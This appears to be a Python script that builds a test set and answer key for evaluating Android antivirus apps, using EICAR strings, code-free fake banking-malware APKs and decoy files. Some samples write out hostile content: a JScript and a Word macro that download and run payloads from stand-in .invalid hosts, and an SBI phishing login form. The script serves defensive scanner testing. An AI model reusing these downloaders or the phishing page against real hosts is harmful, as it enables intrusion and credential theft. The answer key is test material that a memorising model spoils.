"""Virus Vigil exam: HARMLESS files that copy the tricks real malware uses.

Nothing here runs or can run: the "test virus" is the industry's EICAR test string (a harmless
line every antivirus agrees to call a virus), the fake apps have no code at all, and every web
address points at .invalid (a name that can never exist).

The EICAR text never appears in this source (built reversed) and the output is one base64 file,
so Windows Defender on the laptop never sees a test virus. It is decoded ON the emulator.

Output: exam.b64 (a base64 tar whose paths are relative to /sdcard) and exam.json (the answer key).
"""
import base64, io, json, os, subprocess, sys, tarfile, zipfile, tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
SDK = "D:/dev/android-sdk"
AAPT2 = f"{SDK}/build-tools/36.0.0/aapt2.exe"
JAR = f"{SDK}/platforms/android-36/android.jar"

# The EICAR standard test string, stored reversed so this file itself is not a "test virus".
EICAR = ("*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X"[::-1]).encode()
assert len(EICAR) == 68 and EICAR.startswith(b"X5O!P%@AP")


def zip_bytes(members, pwd_note=False):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in members:
            z.writestr(name, data)
    return b.getvalue()


def encrypted_zip(name, data):
    """A password zip (ZipCrypto) built with 7-Zip in a temp folder, from bytes that are never
    written plain to disk: 7z reads them from stdin."""
    d = tempfile.mkdtemp()
    out = os.path.join(d, "locked.zip")
    r = subprocess.run(["7z", "a", "-tzip", "-pinfected", "-mem=ZipCrypto", f"-si{name}", out],
                       input=data, capture_output=True)
    assert r.returncode == 0, r.stderr
    b = open(out, "rb").read()
    os.remove(out); os.rmdir(d)
    return b


def targz(name, data):
    b = io.BytesIO()
    with tarfile.open(fileobj=b, mode="w:gz") as t:
        ti = tarfile.TarInfo(name); ti.size = len(data)
        t.addfile(ti, io.BytesIO(data))
    return b.getvalue()


MANIFEST = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="{pkg}">
  <uses-permission android:name="android.permission.RECEIVE_SMS"/>
  <uses-permission android:name="android.permission.READ_SMS"/>
  <uses-permission android:name="android.permission.SEND_SMS"/>
  <uses-permission android:name="android.permission.READ_CONTACTS"/>
  <uses-permission android:name="android.permission.READ_CALL_LOG"/>
  <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
  <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
  <uses-permission android:name="android.permission.INTERNET"/>
  <application android:label="{label}" android:hasCode="false">
    <service android:name="{pkg}.Helper" android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
      <intent-filter><action android:name="android.accessibilityservice.AccessibilityService"/></intent-filter>
    </service>
    <receiver android:name="{pkg}.SmsIn" android:exported="true"
              android:permission="android.permission.BROADCAST_SMS">
      <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED"/></intent-filter>
    </receiver>
  </application>
</manifest>
"""


def fake_app(pkg, label):
    """An APK with a manifest that asks for what SMS-stealing banking malware asks for, no launcher
    icon (hides itself), and NO CODE (hasCode=false): it cannot do anything."""
    d = tempfile.mkdtemp()
    m = os.path.join(d, "AndroidManifest.xml")
    open(m, "w").write(MANIFEST.format(pkg=pkg, label=label))
    out = os.path.join(d, "app.apk")
    r = subprocess.run([AAPT2, "link", "-o", out, "-I", JAR, "--manifest", m, "--min-sdk-version", "24",
                        "--target-sdk-version", "34"], capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    b = open(out, "rb").read()
    for f in os.listdir(d): os.remove(os.path.join(d, f))
    os.rmdir(d)
    return b


def add_to_apk(apk, name, data):
    b = io.BytesIO(apk)
    with zipfile.ZipFile(b, "a", zipfile.ZIP_DEFLATED) as z:
        z.writestr(name, data)
    return b.getvalue()


WA = "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents"
stealer = fake_app("com.whatsapp.update", "WhatsApp")
kyc = fake_app("com.sbi.kyc.update", "SBI YONO KYC")
tiny_pe = b"MZ" + b"\x00" * 58 + b"\x40\x00\x00\x00" + b"PE\x00\x00" + b"\x00" * 200

files = [
    # id, path under /sdcard, bytes, what a premium antivirus does, what it imitates
    ("A1", "Download/eicar.com", EICAR, "detect", "the industry test virus, plain"),
    ("A2", "Download/holiday_photo.jpg", EICAR, "detect", "test virus renamed as a photo"),
    ("A3", "Download/eicar.zip", zip_bytes([("eicar.com", EICAR)]), "detect", "test virus in a zip"),
    ("A4", "Download/backup.zip", zip_bytes([("old.zip", zip_bytes([("inner.zip", zip_bytes([("readme.com", EICAR)]))]))]),
     "detect", "test virus 3 zips deep"),
    ("A5", "Download/game_mod.apk", add_to_apk(fake_app("com.fun.gamemod", "Game Mod"), "assets/payload.bin", EICAR),
     "detect", "test virus hidden inside an app file"),
    ("A6", "Download/logs.tar.gz", targz("logs/eicar.com", EICAR), "detect", "test virus in a .tar.gz"),
    ("A7", "Download/locked.zip", encrypted_zip("eicar.com", EICAR), "say-locked",
     "test virus in a password zip (no scanner can read it; a good one says so)"),
    ("B1", "Download/WhatsApp_Update.apk", stealer, "flag",
     "fake 'WhatsApp' app: reads SMS, accessibility, draws over apps, hides its icon"),
    ("B2", "Download/Invoice_2026.pdf", stealer, "flag", "that same app file named as a PDF"),
    ("B3", f"{WA}/SBI_KYC_update.apk", kyc, "flag", "the KYC-update scam app, arriving via WhatsApp"),
    ("B4", "Download/photos.zip", zip_bytes([("IMG_2041.jpg.apk", stealer)]), "flag", "the fake app inside a zip"),
    ("C1", "Download/invoice.pdf.exe", tiny_pe, "flag", "Windows program with a double extension"),
    ("C2", "Download/update.js", (b"var s=new ActiveXObject('WScript.Shell');var x=new ActiveXObject('MSXML2.XMLHTTP');"
                                   b"x.open('GET','http://payload.invalid/a.exe',false);x.send();"
                                   b"var st=new ActiveXObject('ADODB.Stream');st.Open();st.Type=1;st.Write(x.responseBody);"
                                   b"st.SaveToFile(s.ExpandEnvironmentStrings('%TEMP%')+'\\\\a.exe',2);s.Run('%TEMP%\\\\a.exe');"),
     "flag", "script that downloads and runs a program (address can never exist)"),
    ("C3", "Download/Payment_Details.html",
     b"<html><title>SBI Online - Login</title><body><form action='http://sbi-kyc.invalid/collect.php' method=post>"
     b"Username <input name=u> Password <input type=password name=p> OTP <input name=otp>"
     b"<button>Login</button></form></body></html>", "flag", "bank login page that sends to a fake address"),
    ("C4", "Download/Salary_Sheet.docm", zip_bytes([
        ("[Content_Types].xml", b"<Types/>"),
        ("word/document.xml", b"<w:document/>"),
        ("word/vbaProject.bin", b"Attribute VB_Name = \"ThisDocument\"\r\nSub AutoOpen()\r\n  Shell \"powershell -w hidden -c iwr http://payload.invalid/x.ps1|iex\"\r\nEnd Sub\r\n")]),
     "flag", "Word file with a macro that runs PowerShell on open"),
    ("Z1", "Download/clean_notes.txt", b"Shopping: milk, eggs, bread.\n", "clean", "control: an ordinary file"),
    ("Z2", "Download/clean_archive.zip", zip_bytes([("a.txt", b"hello\n")]), "clean", "control: an ordinary zip"),
]

tb = io.BytesIO()
with tarfile.open(fileobj=tb, mode="w") as t:
    for _id, path, data, _e, _w in files:
        ti = tarfile.TarInfo("sdcard/" + path); ti.size = len(data)
        t.addfile(ti, io.BytesIO(data))
open(os.path.join(HERE, "exam.b64"), "wb").write(base64.encodebytes(tb.getvalue()))
json.dump([{"id": i, "path": p, "expect": e, "what": w, "size": len(d)} for i, p, d, e, w in files],
          open(os.path.join(HERE, "exam.json"), "w"), indent=1)
open(os.path.join(HERE, "stealer.apk"), "wb").write(stealer)  # no test virus in it; for the install test
print(len(files), "files;", len(tb.getvalue()), "bytes tar")
